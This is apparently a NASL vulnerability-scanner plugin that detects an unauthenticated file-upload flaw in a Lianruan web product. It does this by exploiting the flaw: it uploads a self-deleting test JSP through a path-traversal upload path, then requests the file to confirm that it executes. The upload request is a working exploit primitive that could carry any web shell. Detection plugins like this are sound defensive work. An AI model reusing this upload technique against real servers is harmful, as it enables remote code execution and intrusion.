############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if (description)
{
  script_id(51799289);
  script_version("1.3");
  script_name(english:"lianruan_file_upload_nasl");
  script_summary(english:"lianruan_file_upload_nasl");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"lianruan_file_upload_nasl");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80, 443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

file_name= hexstr(rand_str(length:4));

data = '-----------------------------1a96160466c645ddb74cb158efa1da0d
Content-Disposition: form-data; name="input_localfile"; filename="'+file_name+'.jsp"
Content-Type: image/png

<%
out.println("lianruan_file_upload_test_vuln");
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>
-----------------------------1a96160466c645ddb74cb158efa1da0d
Content-Disposition: form-data; name="uploadpath"

../webapps/notifymsg/devreport/
-----------------------------1a96160466c645ddb74cb158efa1da0d--';

function check_vuln(port){
		url = "/uai/download/uploadfileToPath.htm";
		req = http_send_recv3(method: "POST", port: port, data:data, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","multipart/form-data; boundary=-----------------------------1a96160466c645ddb74cb158efa1da0d"));
		if("200 O">< req[0] && "</label>" >< req[2]){
		sleep(1);
		url_get = "/devreport/"+file_name+".jsp";
		res = http_send_recv3(method: "GET", port: port, item: url_get, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
		if("200" >< res[0] && "lianruan_file_upload_test_vuln" >< res[2]){
			security_hole(port:port, extra:req[2]);
		}
	}
}

function check_vuln_ssl(port){
        res =   'POST /uai/download/uploadfileToPath.htm HTTP/1.1\r\n'+
			    'Connection: Close\r\n'+
				'Host: '+get_host_ip()+':'+port+'\r\n'+
				'Pragma: no-cache\r\n'+
				'Content-Type: multipart/form-data; boundary=-----------------------------1a96160466c645ddb74cb158efa1da0d\r\n'+
				'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\r\n'+
				'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\n'+
				'Accept-Language: en\r\n'+
				'Accept-Charset: iso-8859-1,*,utf-8\r\n'+
				'Content-Length: 518\r\n\r\n'+data;
		ssl_req = https_req_get(port:port , request:res);
		if("200 O">< ssl_req && "</label>" >< ssl_req){
			sleep(1);
			url_get = "/devreport/"+file_name+".jsp";
			res_get =   'GET '+url_get+' HTTP/1.1\r\n'+
						'Connection: Close\r\n'+
						'Host: '+get_host_ip()+':'+port+'\r\n'+
						'Pragma: no-cache\r\n'+
						'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\r\n'+
						'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\n'+
						'Accept-Language: en\r\n'+
						'Accept-Charset: iso-8859-1,*,utf-8\r\n'+
						'Content-Length: 518\r\n';
			ssl_req2 = https_req_get(port:port , request:res_get);
			if("200 O"><ssl_req2 && "lianruan_file_upload_test_vuln" >< ssl_req){
				if (report_verbosity > 0) security_hole(port:port, extra:ssl_req);
				else security_hole(port);
			}
		}
}
##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
